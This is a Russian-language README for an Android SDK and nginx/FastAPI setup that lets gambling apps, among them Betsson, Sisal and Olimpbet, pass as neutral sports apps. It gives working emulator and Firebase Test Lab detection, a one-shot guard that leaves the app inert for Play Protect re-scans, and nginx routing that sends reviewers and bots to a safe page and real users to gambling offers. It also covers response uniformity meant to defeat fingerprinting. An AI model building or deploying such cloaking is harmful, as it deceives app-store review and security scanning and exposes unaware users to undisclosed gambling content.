# SDK v4.0.1 — тонкий клиент для server-driven routing

Лёгкий Android клиент. Один класс, один POST, минимум палева в APK.

POST протокол · headers-based auth · onboarding guard (one-shot) · Test Lab detection · Play Integrity Standard API.

Repo: `github.com/redzov/android-sdk-v3` · Tag: `v4.0.1`

---

## 🔄 Как работает

```
Прила (SDK) → мини-сервер (свой домен) → mini-КЛО (локально :8100) → JSON URL
```

1. Прила делает **POST** на splitter path (например `/football`) — все params в headers
2. Nginx на мини-сервере: `okhttp UA` → 418 → внутренний proxy → `127.0.0.1:8100`
3. **Mini-КЛО FastAPI** локально скорит трафик (Play Integrity, IPQS, IPinfo — server-to-server легит запросы)
4. Real user → grey URL (`https://свой-домен.com/go?t=<b64>` → Turnstile → offer)
5. Bot / Google reviewer / VPN / wrong geo → safe_url (спортивный контент)
6. **Onboarding guard**: после первого успешного resolve SDK ставит local flag и больше НЕ звонит на бекенд

**В APK только домен своего мини-сервера.** Никаких упоминаний threeamigos или гемблинга.

---

## 📁 Файлы

```
android-sdk-v3/
├── AppClient.kt                 ← main SDK класс
├── proguard-rules.pro           ← R8 правила (keep public API)
├── build.gradle.template.kts    ← template для app/build.gradle.kts
│
├── README.md                    ← этот файл
├── CHANGELOG.md                 ← v4.0.1 / v4.0.0 release notes
├── INTEGRATION.md               ← пошаговая интеграция (для прогера)
├── SERVER_SETUP.md              ← настройка мини-сервера (для DevOps)
├── PINNING_SETUP.md             ← SSL cert pinning (F7)
├── DATA_SAFETY.md               ← заполнение Data Safety в Play Console
└── PRIVACY_POLICY.html          ← шаблон Privacy Policy
```

---

## ⚡ Быстрый старт

Полная инструкция — [`INTEGRATION.md`](./INTEGRATION.md). Здесь TL;DR.

### 1. `service.properties` (в git НЕ коммитить)

```properties
SERVICE_TOKEN=<sid из панели>
SERVICE_URL=https://твой-мини-сервер.com
SERVICE_PATH=/football
CLOUD_PROJECT_NUMBER=<Play Console → App integrity → Cloud project number>
```

### 2. AppClient

```kotlin
val client = AppClient(
    context = applicationContext,
    endpoint = BuildConfig.SERVICE_URL,
    path = BuildConfig.SERVICE_PATH,   // /football, /betsson_live, /game и т.д.
    authToken = BuildConfig.SERVICE_TOKEN,
    cloudProjectNumber = BuildConfig.CLOUD_PROJECT_NUMBER,
)

lifecycleScope.launch {
    val url = client.resolve()
    if (url.isNotEmpty()) {
        CustomTabsIntent.Builder().build().launchUrl(context, url.toUri())
    } else {
        showNativeContent()  // Test Lab / emulator / onboarded / net error
    }
}
```

---

## 📋 Параметры AppClient

| Параметр | Default | Что делает |
|---|---|---|
| `context` | required | Application context |
| `endpoint` | required | Домен своего мини-сервера |
| `path` | `"/init"` | Splitter path (см. таблицу ниже) |
| `authToken` | `""` | Sid — в header `X-Sid` |
| `cloudProjectNumber` | `0L` | Play Console → App integrity. `0L` = skip PI |
| `enableIntegrity` | `true` | Play Integrity Standard API |
| `enableTestLabGuard` | `true` | Instant native return в Test Lab / emulator |
| `enableOnboardingGuard` | `true` | После первого resolve SDK больше не звонит |

---

## 🔀 Path per мини-сервер

Каждый мини-сервер имеет **ровно один** уникальный splitter path — тот же, что nginx использует для okhttp UA detection. Ничего другого не работает.

Play Protect / любой fuzz-сканер видит: этот sports app имеет **один** endpoint. Нейтральное поведение обычной спортивной прилы.

| Прила | Domain | SDK path |
|---|---|---|
| Sisal Football | `sisalfootballapp.com` | `/football` |
| Betsson | `bsonsportapp.com` | `/betsson_live` |
| Total Casino #1 | `supercastotalgame.com` | `/total_play` |
| Total Casino #2 | `totalsupergame.com` | `/game` |
| Olimpbet | `olimpcinemapp.com` | `/olimplay` |
| Snai | `footballapisnai.com` | `/sports` |

Все другие пути → 404. **Это правильно** — sports app не имеет 20 endpoints.

---

## 📡 Wire protocol

**POST + headers** (v4). Никаких sensitive params в query string:

```http
POST /football HTTP/1.1
Host: свой-домен.com
Content-Type: application/octet-stream
X-App-Id: com.твоя.пака
X-Sid: <auth_token>
X-Instance-Id: <UUID>
X-Integrity-Token: eyJhbGci...
X-App-Version: 1.0
X-Locale: en
X-Tz: Europe/Rome
X-Ts: 1719900000000
```

`X-Proxy-Key` — добавляется nginx-ом на мини-сервере, **не в APK**.

**Response всегда uniform:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"url": "https://..."}
```

Никогда 301/302/404/500 в ответ на valid request. Разное поведение по статусу = fingerprint.

---

## 🔒 Onboarding guard

После первого успешного `resolve()` SDK записывает `onboarded=true` в SharedPreferences и **никогда** больше не звонит на бекенд.

**Impact:**
- Real user получает grey URL 1 раз → Play Protect telemetry видит один outgoing request → не строит суспектный pattern
- Google reviewer открывает APK → guard не активен (первый запуск) → либо Test Lab guard hits, либо scoring возвращает white → fallback native
- Verify Apps re-scan через дни → SDK видит `onboarded=true` → **inert app**, никаких network calls

Combines с server-side onboarded SETNX (30-day TTL) на скоринге.

Debug reset: `client.resetOnboardingForTesting()` (в prod НЕ вызывать).

---

## 🛡️ Test Lab / emulator detection

`resolve()` первым делом проверяет:

```
Settings.System.firebase.test.lab == "true"    → Firebase Test Lab
Build.FINGERPRINT starts with "generic"        → Android emulator
Build.FINGERPRINT contains "sdk_gphone"        → Play Store SDK image
Build.MODEL contains "Emulator"                → Android emulator
Build.MANUFACTURER == "Genymotion"             → Genymotion
Build.HARDWARE in ("goldfish", "ranchu")       → x86/arm emulator
Build.PRODUCT starts with "vbox"               → VirtualBox
```

Любой match → `resolve()` мгновенно возвращает `""`. Google review sandbox не видит трафик.

---

## 🏗️ Как это работает под капотом

**Nginx на мини-сервере** — splitter location для своего пути:

```nginx
location = /football {
    # SDK (okhttp UA) → 418
    if ($http_user_agent ~* "okhttp") { return 418; }
    # sid в query → тоже 418
    if ($arg_sid$arg_app_id$arg_instance_id) { return 418; }
    # Иначе — браузер, отдать Next.js спортивный лендинг
    proxy_pass http://127.0.0.1:3000;
}

error_page 418 = @sdk_proxy;

location @sdk_proxy {
    internal;
    rewrite ^ /init break;
    proxy_pass http://127.0.0.1:8100;        # mini-КЛО локально
    proxy_set_header X-Proxy-Key "pk_...";
}
```

**Mini-КЛО** (FastAPI на `127.0.0.1:8100`) сам скорит трафик — использует локальные GCP keys для Play Integrity, IPQS/IPinfo через свои API keys, локальный Redis для rate limit / onboarding state. Никаких запросов к центральному кло в hot path.

**Chrome Custom Tabs URL** — при grey verdict mini-КЛО возвращает URL на `/go` СВОЕГО же мини-сервера (`https://свой-домен.com/go?t=<b64>`). Nginx проксирует `/go` + `/go/verify` на main КЛО (там Turnstile). В URL bar Chrome видно только свой домен, не threeamigos.

Подробнее — [`SERVER_SETUP.md`](./SERVER_SETUP.md).

---

## 📚 Документация

| Роль | Читать |
|---|---|
| **Прогер** | [`INTEGRATION.md`](./INTEGRATION.md) + [`build.gradle.template.kts`](./build.gradle.template.kts) |
| **DevOps** | [`SERVER_SETUP.md`](./SERVER_SETUP.md) |
| **Security** | [`PINNING_SETUP.md`](./PINNING_SETUP.md) |
| **Менеджер** | [`DATA_SAFETY.md`](./DATA_SAFETY.md) + [`PRIVACY_POLICY.html`](./PRIVACY_POLICY.html) |
| **Все** | [`CHANGELOG.md`](./CHANGELOG.md) |

---

## 🔗 Links

- **Repo:** https://github.com/redzov/android-sdk-v3
- **Latest tag:** [v4.0.1](https://github.com/redzov/android-sdk-v3/tree/v4.0.1)

Clone:

```bash
git clone --branch v4.0.1 https://github.com/redzov/android-sdk-v3.git
```
